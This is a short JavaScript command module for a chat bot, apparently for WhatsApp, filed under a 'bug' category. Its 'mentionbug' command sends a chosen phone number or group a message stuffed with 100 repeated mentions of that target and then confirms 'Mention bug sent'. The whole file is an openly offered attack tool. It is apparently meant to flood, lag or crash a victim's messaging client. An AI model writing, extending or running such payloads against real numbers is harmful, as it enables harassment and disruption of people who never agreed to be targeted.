module.exports = {
  name: 'mentionbug',
  alias: [],
  description: 'Sends a heavy mention payload to target number or group',
  category: 'bug',

  async run(bot, msg, args, platform) {
    const target = args[0];

    if (!target) {
      return bot.sendMessage(msg.chat.id, '⚠️ Please provide a number or group ID.\n\nExample:\n.mentionbug 233XXXXXXXXX');
    }

    try {
      const mentions = [];
      const mentionPayload = [];

      for (let i = 0; i < 100; i++) {
        const fakeJid = `${target}@s.whatsapp.net`;
        mentions.push(fakeJid);
        mentionPayload.push(`@${target}`);
      }

      await bot.sendMessage(target + '@s.whatsapp.net', mentionPayload.join(' '), {
        mentions,
      });

      await bot.sendMessage(msg.chat.id, `✅ Mention bug sent to ${target}`);
    } catch (e) {
      await bot.sendMessage(msg.chat.id, `❌ Failed to send mention bug.\n\n${e.message}`);
    }
  }
};
